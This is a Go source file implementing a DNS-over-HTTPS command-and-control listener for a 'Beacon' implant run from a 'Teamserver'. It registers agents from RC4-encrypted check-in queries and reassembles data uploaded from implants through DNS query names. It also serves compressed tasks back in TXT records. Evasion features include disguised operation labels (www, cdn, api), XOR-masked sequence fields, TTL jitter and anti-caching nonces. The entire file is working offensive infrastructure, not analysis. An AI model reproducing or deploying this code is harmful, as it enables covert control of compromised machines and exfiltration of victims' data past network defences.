package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"crypto/rc4"

	dns "github.com/miekg/dns"
)

// dohDebug controls verbose logging for the DoH-aware DNS listener.
// It is enabled by default while we stabilise the new behaviour behind
// public DoH resolvers. You can turn it off for production if needed.
const dohDebug = true

type dohFragBuf struct {
	total       uint32
	buf         []byte
	filled      uint32
	highWater   uint32 // highest contiguous offset received (for idempotent handling)
	expectedOff uint32 // expected next offset for gap detection
	lastUpdate  time.Time
	seenOffsets map[uint32]bool // track seen offsets to prevent duplicate counting
}

type dohDownBuf struct {
	total uint32
	off   uint32
	buf   []byte
}

const metaV1Size = 8

type metaV1 struct {
	Version   byte
	MetaFlags byte
	Reserved  uint16
	QueryTask uint32
}

func parseMetaV1(data []byte) (metaV1, []byte, bool) {
	var m metaV1
	if len(data) < metaV1Size {
		return m, data, false
	}
	m.Version = data[0]
	m.MetaFlags = data[1]
	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
	m.QueryTask = binary.LittleEndian.Uint32(data[4:8])
	return m, data[metaV1Size:], true
}

// DoHListener is a DNS authority-style listener that is designed to sit
// behind public DoH / recursive resolvers. From the outside, it looks
// like a normal authoritative DNS server on UDP/TCP (HostBind:PortBind).
// From the Beacon's point of view, traffic goes through public DoH,
// recursive resolvers, and finally reaches this listener as plain DNS.
type DoHListener struct {
	Config DoHConfig
	Name   string
	Active bool

	udpServer *dns.Server
	tcpServer *dns.Server
	ts        Teamserver

	mu        sync.Mutex
	upFrags   map[string]*dohFragBuf
	downFrags map[string]*dohDownBuf
	rng       *rand.Rand
}

func (d *DoHListener) Start(ts Teamserver) error {
	if d.Config.TTL <= 0 {
		d.Config.TTL = 10
	}
	if d.Config.PktSize <= 0 || d.Config.PktSize > 64000 {
		d.Config.PktSize = 1024
	}

	// Initialize local RNG for TTL jitter (avoid deprecated global seed)
	d.rng = rand.New(rand.NewSource(time.Now().UnixNano()))

	d.upFrags = make(map[string]*dohFragBuf)
	d.downFrags = make(map[string]*dohDownBuf)

	addr := net.JoinHostPort(d.Config.HostBind, strconv.Itoa(d.Config.PortBind))

	mux := dns.NewServeMux()
	mux.HandleFunc(".", d.handleDNS)

	d.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	d.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
	d.ts = ts

	go func() {
		if err := d.udpServer.ListenAndServe(); err != nil {
			if dohDebug {
				fmt.Printf("[BeaconDoH-DNS] UDP listener error: %v\n", err)
			}
		}
	}()

	go func() {
		if err := d.tcpServer.ListenAndServe(); err != nil {
			if dohDebug {
				fmt.Printf("[BeaconDoH-DNS] TCP listener error: %v\n", err)
			}
		}
	}()

	// Start cleanup goroutine for stale fragments
	go d.cleanupStaleFragments()

	time.Sleep(200 * time.Millisecond)
	d.Active = true
	return nil
}

// cleanupStaleFragments periodically removes incomplete upload fragments
// that haven't been updated for a long time (likely due to DNS packet loss)
func (d *DoHListener) cleanupStaleFragments() {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		if !d.Active {
			return
		}

		now := time.Now()
		staleTimeout := 5 * time.Minute // Fragments older than 5 minutes are considered stale

		d.mu.Lock()
		for sid, fb := range d.upFrags {
			if now.Sub(fb.lastUpdate) > staleTimeout {
				if dohDebug {
					fmt.Printf("[BeaconDoH-DNS] [CLEANUP] Removing stale upload fragment | sid=%s | filled=%d/%d | age=%v\n",
						sid, fb.filled, fb.total, now.Sub(fb.lastUpdate))
				}
				delete(d.upFrags, sid)
			}
		}
		d.mu.Unlock()
	}
}

func (d *DoHListener) Stop() error {
	d.Active = false
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	var err error
	if d.udpServer != nil {
		if e := d.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if d.tcpServer != nil {
		if e := d.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

func (d *DoHListener) handlePutFragment(sid string, seq int, data []byte) {
	if sid == "" || len(data) == 0 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}
	if len(data) <= 8 {
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	var total uint32
	var offset uint32
	var chunk []byte
	meta, rest, hasMeta := parseMetaV1(data)
	if hasMeta {
		if dohDebug {
			fmt.Printf("[SRV-UP] META v=%d flags=0x%x qtask=%d sid=%s len=%d\n", meta.Version, meta.MetaFlags, meta.QueryTask, sid, len(data))
		}
		if len(rest) <= 8 {
			_ = d.ts.TsAgentProcessData(sid, rest)
			return
		}
		total = binary.BigEndian.Uint32(rest[0:4])
		offset = binary.BigEndian.Uint32(rest[4:8])
		chunk = rest[8:]
	} else {
		total = binary.BigEndian.Uint32(data[0:4])
		offset = binary.BigEndian.Uint32(data[4:8])
		chunk = data[8:]
	}

	const maxUploadSize = 4 << 20 // 4MB 上行限制
	if total == 0 || total > maxUploadSize {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] OVERSIZE bypass | sid=%s total=%d offset=%d frame_len=%d limit=%d\n",
				sid, total, offset, len(data), maxUploadSize)
		}
		_ = d.ts.TsAgentProcessData(sid, data)
		return
	}

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = d.ts.TsAgentProcessData(sid, chunk)
		return
	}

	key := sid

	d.mu.Lock()
	defer d.mu.Unlock()

	fb, ok := d.upFrags[key]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		// 新一轮上行会话：
		//  - 第一次看到该 sid（!ok），或者
		//  - total 发生变化（协议版本/任务大小变化），或者
		//  - offset 回到 0 但之前已经有填充的数据（重传/新任务覆盖旧任务）。
		// 为避免不同任务之间的缓冲区污染，始终重新分配缓冲并重置填充进度。
		buf := make([]byte, total)
		fb = &dohFragBuf{
			total:       total,
			buf:         buf,
			filled:      0,
			highWater:   0,
			expectedOff: 0,
			lastUpdate:  time.Now(),
			seenOffsets: make(map[uint32]bool),
		}
		d.upFrags[key] = fb
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] New upload session | sid=%s | total=%d bytes\n", sid, total)
		}
	}
	if offset >= fb.total {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] WARN: offset %d >= total %d | sid=%s\n", offset, fb.total, sid)
		}
		return
	}

	// IDEMPOTENT: Check if we've already processed this offset
	// This handles duplicate packets from multiple DNS resolvers
	if fb.seenOffsets[offset] {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] DUPLICATE offset=%d ignored | sid=%s\n", offset, sid)
		}
		return // Already processed, ignore duplicate
	}

	// Gap detection: check if we received out-of-order
	if offset != fb.expectedOff {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] GAP DETECTED | sid=%s | expected offset %d, got %d\n", sid, fb.expectedOff, offset)
		}
	}

	end := offset + uint32(len(chunk))
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	// Mark this offset as seen (idempotent)
	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.expectedOff = end // update expected next offset
	fb.lastUpdate = time.Now()

	// Update high water mark
	if end > fb.highWater {
		fb.highWater = end
	}

	if dohDebug {
		progress := float64(fb.filled) * 100.0 / float64(fb.total)
		fmt.Printf("[BeaconDoH-DNS] [UP] Fragment received | sid=%s | offset=%d len=%d | progress=%d/%d (%.1f%%)\n",
			sid, offset, n, fb.filled, fb.total, progress)
	}

	if fb.filled >= fb.total {
		if dohDebug {
			fmt.Printf("[BeaconDoH-DNS] [UP] Reassembly Complete! sid=%s | Total: %d bytes\n", sid, fb.total)
			fmt.Printf("[BeaconDoH-DNS] [UP] Summary | sid=%s total=%d filled=%d highWater=%d unique_offsets=%d\n",
				sid, fb.total, fb.filled, fb.highWater, len(fb.seenOffsets))
		}
		_ = d.ts.TsAgentProcessData(sid, fb.buf)
		delete(d.upFrags, key)
	}
}

// 协议约定（与 DNS Beacon 保持一致）：
// qname = <sid>.<op>.<seq>.<idx>.<data>.<...>.domain
// 其中 data = base32(no padding, upper) 的 RC4(payload)
// sid 建议为 8 字节 ID 的 16 位 hex 字符串，op = HI/PUT/GET
func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	// TTL with jitter
	baseTTL := uint32(d.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(d.rng.Intn(60))

	// 记录请求的 Qtype，用于区分 A 心跳和 TXT 下行
	reqQType := dns.TypeTXT
	if len(r.Question) > 0 {
		reqQType = r.Question[0].Qtype
	}

	// Note: EDNS0 parsing removed; we now use a fixed conservative chunk size
	// for DoH compatibility since public resolvers often truncate large responses.
	_ = r.IsEdns0() // suppress unused warning if needed in future

	for _, q := range r.Question {
		labels := dns.SplitDomainName(q.Name)
		base := labels

		if d.Config.Domain != "" {
			dom := strings.TrimSuffix(strings.ToLower(d.Config.Domain), ".")
			for i := range labels {
				tail := strings.ToLower(strings.Join(labels[i:], "."))
				if tail == dom {
					base = labels[:i]
					break
				}
			}
		}

		var sid, op string
		var seq, idx int
		var signalBits, seqCounter int
		var dataB []byte

		if len(base) >= 5 {
			sid = base[0]
			rawOp := strings.ToLower(base[1])
			switch rawOp {
			case "www", "hi":
				op = "HI"
			case "cdn", "put":
				op = "PUT"
			case "api", "get":
				op = "GET"
			case "hb":
				op = "HB" // Heartbeat with ACK offset
			default:
				op = ""
			}

			if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
				seq = int(v ^ 0x39913991)
			}
			if v, err := strconv.ParseUint(base[3], 16, 32); err == nil {
				idx = int(v ^ 0x39913991)
			}
			// Derive signal bits and logical seq counter from decoded seq
			if seq != 0 {
				signalBits = (seq >> 12) & 0xF
				seqCounter = seq & 0x0FFF
			} else {
				signalBits = 0
				seqCounter = 0
			}

			dataLabel := strings.Join(base[4:], "")
			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
			dataLabel = strings.ToUpper(dataLabel)
			if db, err := enc.DecodeString(dataLabel); err == nil {
				dataB = db
			}
		}

		// basic anti-abuse validation: sid must be 8-char hex
		if sid != "" {
			validSid := len(sid) == 8
			if validSid {
				for i := 0; i < 8; i++ {
					c := sid[i]
					if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
						validSid = false
						break
					}
				}
			}
			if !validSid {
				op = ""
			}
		}

		maxPayload := d.Config.PktSize * 4
		if maxPayload <= 0 {
			maxPayload = 4096
		}
		if len(dataB) > maxPayload {
			dataB = nil
		}

		if dohDebug {
			remote := ""
			if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
				remote = addr.IP.String()
			}

			if sid != "" {
				ts := time.Now().UnixMilli()
				fmt.Printf("[SRV-RX] t=%d op=%s sid=%s raw_seq=%s raw_idx=%s seq=%d idx=%d sig=0x%x ctr=%d data_len=%d src=%s\n",
					ts, op, sid,
					base[2], base[3],
					seq, idx,
					signalBits, seqCounter,
					len(dataB), remote)
			}
		}

		switch op {
		case "HI", "PUT":
			if len(dataB) > 0 {
				if op == "HI" {
					keyBytes, _ := hex.DecodeString(d.Config.EncryptKey)
					if len(keyBytes) == 16 && len(dataB) >= 8 {
						if c, e := rc4.NewCipher(keyBytes); e == nil {
							fullBeat := make([]byte, len(dataB))
							c.XORKeyStream(fullBeat, dataB)
							if len(fullBeat) >= 8 {
								agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
								agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
								beat := fullBeat[8:]
								if !d.ts.TsAgentIsExists(agentId) {
									externalIP := ""
									if addr, ok := w.RemoteAddr().(*net.UDPAddr); ok {
										externalIP = addr.IP.String()
									}
									if dohDebug {
										fmt.Printf("[BeaconDoH-DNS] HI create agent type=%s id=%s ip=%s\n", agentType, agentId, externalIP)
									}
									_, _ = d.ts.TsAgentCreate(agentType, agentId, beat, d.Name, externalIP, true)
								}
								_ = d.ts.TsAgentSetTick(agentId)
							}
						}
					}
				}
				if op == "PUT" {
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] %s payload len=%d sid=%s\n", op, len(dataB), sid)
					}
					d.handlePutFragment(sid, seq, dataB)
					if sid != "" {
						_ = d.ts.TsAgentSetTick(sid)
					}
				}
			}

			// ACK：根据 QType 返回最小响应
			if reqQType == dns.TypeA {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("127.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else if reqQType == dns.TypeAAAA {
				rr := &dns.AAAA{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl}, AAAA: net.ParseIP("::1").To16()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
				m.Answer = append(m.Answer, rr)
			}

		case "GET":
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			// Parse requested offset from dataB (agent sends [offset:4][nonce:4])
			// APT format: [offset:4][nonce:4] = 8 bytes
			var reqOffset uint32 = 0
			var reqNonce uint32 = 0
			if len(dataB) >= 4 {
				reqOffset = binary.BigEndian.Uint32(dataB[0:4])
			}
			if len(dataB) >= 8 {
				reqNonce = binary.BigEndian.Uint32(dataB[4:8])
			}
			if dohDebug && reqOffset > 0 {
				fmt.Printf("[BeaconDoH-DNS] [ACK] req_off=%d nonce=%08x | sid=%s\n", reqOffset, reqNonce, sid)
			}

			var df *dohDownBuf
			if sid != "" {
				d.mu.Lock()
				if buf, ok := d.downFrags[sid]; ok {
					df = buf
					// Track agent progress inferred from requested offset
					if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
						if dohDebug {
							fmt.Printf("[BeaconDoH-DNS] [ACK] Advancing offset from %d to %d (sid=%s)\n", df.off, reqOffset, sid)
						}
						df.off = reqOffset
					}
				}
				d.mu.Unlock()
			}

			if df == nil || df.off >= df.total {
				maxDataSize := d.Config.PktSize * 256
				if maxDataSize <= 0 || maxDataSize > (4<<20) {
					maxDataSize = 4 << 20
				}
				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] GET tasks sid=%s total=%d\n", sid, len(p))
					}
					origLen := len(p)
					flags := byte(0)
					payload := p

					const minCompressSize = 2048
					if origLen > minCompressSize {
						var zbuf bytes.Buffer
						wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
						if errW == nil {
							if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
								comp := zbuf.Bytes()
								if len(comp) > 0 && len(comp) < origLen {
									payload = comp
									flags = 1
								}
							} else {
								_ = wz.Close()
							}
						}
					}

					totalLen := 1 + 4 + len(payload)
					buf := make([]byte, totalLen)
					buf[0] = flags
					buf[1] = byte(origLen & 0xFF)
					buf[2] = byte((origLen >> 8) & 0xFF)
					buf[3] = byte((origLen >> 16) & 0xFF)
					buf[4] = byte((origLen >> 24) & 0xFF)
					copy(buf[5:], payload)
					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] [DOWN] Prepared task | sid=%s orig_len=%d flags=%d framed_len=%d\n", sid, origLen, flags, len(buf))
					}

					d.mu.Lock()
					d.downFrags[sid] = df
					d.mu.Unlock()
				}
			}

			var frame []byte
			if df != nil {
				// APT DESIGN: dataB contains [offset:4][nonce:4]
				// Nonce makes each query unique (anti-caching), we only use offset
				requestedOffset := reqOffset
				nonce := reqNonce
				if requestedOffset >= df.total {
					requestedOffset = 0
				}
				if dohDebug {
					fmt.Printf("[BeaconDoH-DNS] [DOWN] offset=%d nonce=%08x | sid=%s\n", requestedOffset, nonce, sid)
				}

				if df.total > 0 {
					maxChunk := d.Config.PktSize
					isTCP := w.RemoteAddr().Network() == "tcp"

					if !isTCP {
						// DoH chunk size: 400 bytes binary = ~540 bytes Base64
						// Most DoH resolvers can handle ~500-600 byte TXT responses over UDP.
						// If truncation occurs, agent will detect offset mismatch and retry.
						const dohSafeChunk = 400
						if maxChunk <= 0 || maxChunk > dohSafeChunk {
							maxChunk = dohSafeChunk
						}
					} else {
						if maxChunk <= 0 {
							maxChunk = 4096
						}
					}

					remaining := df.total - requestedOffset
					chunkLen := remaining
					if chunkLen > uint32(maxChunk) {
						chunkLen = uint32(maxChunk)
					}

					frame = make([]byte, 8+chunkLen)
					binary.BigEndian.PutUint32(frame[0:4], df.total)
					binary.BigEndian.PutUint32(frame[4:8], requestedOffset)
					copy(frame[8:], df.buf[requestedOffset:requestedOffset+chunkLen])

					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] [DOWN] Sending Fragment | sid=%s | %d bytes (ReqOff: %d / Total: %d) | TCP: %v\n",
							sid, chunkLen, requestedOffset, df.total, isTCP)
					}

					// Don't update df.off - let agent control the flow
				}
			}

			if len(frame) == 0 {
				if dohDebug {
					reason := "unknown"
					if df == nil {
						reason = "df_nil"
					} else if df.total == 0 {
						reason = "total_zero"
					}
					fmt.Printf("[BeaconDoH-DNS] [DOWN] Empty TXT response | sid=%s reason=%s\n", sid, reason)
				}
				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{""}}
				m.Answer = append(m.Answer, rr)
			} else {
				b64Str := base64.StdEncoding.EncodeToString(frame)
				var chunks []string
				for len(b64Str) > 255 {
					chunks = append(chunks, b64Str[:255])
					b64Str = b64Str[255:]
				}
				chunks = append(chunks, b64Str)

				rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: chunks}
				m.Answer = append(m.Answer, rr)
			}

		case "HB":
			// Dedicated heartbeat operation (A query with ack_offset + nonce)
			if sid != "" {
				_ = d.ts.TsAgentSetTick(sid)
			}

			// Parse [ackOffset:4][nonce:4] from dataB
			var ackOffset uint32 = 0
			var hbNonce uint32 = 0
			if len(dataB) >= 4 {
				ackOffset = binary.BigEndian.Uint32(dataB[0:4])
			}
			if len(dataB) >= 8 {
				hbNonce = binary.BigEndian.Uint32(dataB[4:8])
			}

			// Check existing task and handle ACK
			d.mu.Lock()
			df, hasDf := d.downFrags[sid]
			if hasDf && ackOffset >= df.total && df.total > 0 {
				// Agent confirmed receipt of entire task
				delete(d.downFrags, sid)
				df = nil
				hasDf = false
				if dohDebug {
					fmt.Printf("[BeaconDoH-DNS] [HB] Task complete | sid=%s ack=%d nonce=%08x\n", sid, ackOffset, hbNonce)
				}
			}
			d.mu.Unlock()

			// If no pending task, try to fetch new tasks from Teamserver
			if !hasDf || df == nil {
				maxDataSize := d.Config.PktSize * 256
				if maxDataSize <= 0 || maxDataSize > (4<<20) {
					maxDataSize = 4 << 20
				}
				if p, err := d.ts.TsAgentGetHostedTasks(sid, maxDataSize); err == nil && len(p) > 0 {
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] [HB] New tasks for sid=%s total=%d bytes\n", sid, len(p))
					}
					origLen := len(p)
					flags := byte(0)
					payload := p

					const minCompressSize = 2048
					if origLen > minCompressSize {
						var zbuf bytes.Buffer
						wz, errW := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
						if errW == nil {
							if _, errC := wz.Write(p); errC == nil && wz.Close() == nil {
								comp := zbuf.Bytes()
								if len(comp) > 0 && len(comp) < origLen {
									payload = comp
									flags = 1
								}
							} else {
								_ = wz.Close()
							}
						}
					}

					totalLen := 1 + 4 + len(payload)
					buf := make([]byte, totalLen)
					buf[0] = flags
					buf[1] = byte(origLen & 0xFF)
					buf[2] = byte((origLen >> 8) & 0xFF)
					buf[3] = byte((origLen >> 16) & 0xFF)
					buf[4] = byte((origLen >> 24) & 0xFF)
					copy(buf[5:], payload)
					df = &dohDownBuf{total: uint32(len(buf)), off: 0, buf: buf}
					if dohDebug {
						fmt.Printf("[BeaconDoH-DNS] [HB] Prepared task | sid=%s orig=%d flags=%d framed=%d\n", sid, origLen, flags, len(buf))
					}

					d.mu.Lock()
					if df != nil {
						d.downFrags[sid] = df
					}
					d.mu.Unlock()
				}
			}

			hasTasks := hasDf && df != nil && df.total > 0 && ackOffset < df.total
			if dohDebug {
				fmt.Printf("[BeaconDoH-DNS] [HB] sid=%s ack=%d nonce=%08x hasTasks=%v\n", sid, ackOffset, hbNonce, hasTasks)
			}

			if hasTasks {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.1").To4()}
				m.Answer = append(m.Answer, rr)
			} else {
				rr := &dns.A{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl}, A: net.ParseIP("0.0.0.0").To4()}
				m.Answer = append(m.Answer, rr)
			}

		default:
			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
			m.Answer = append(m.Answer, rr)
		}
	}

	_ = w.WriteMsg(m)
}
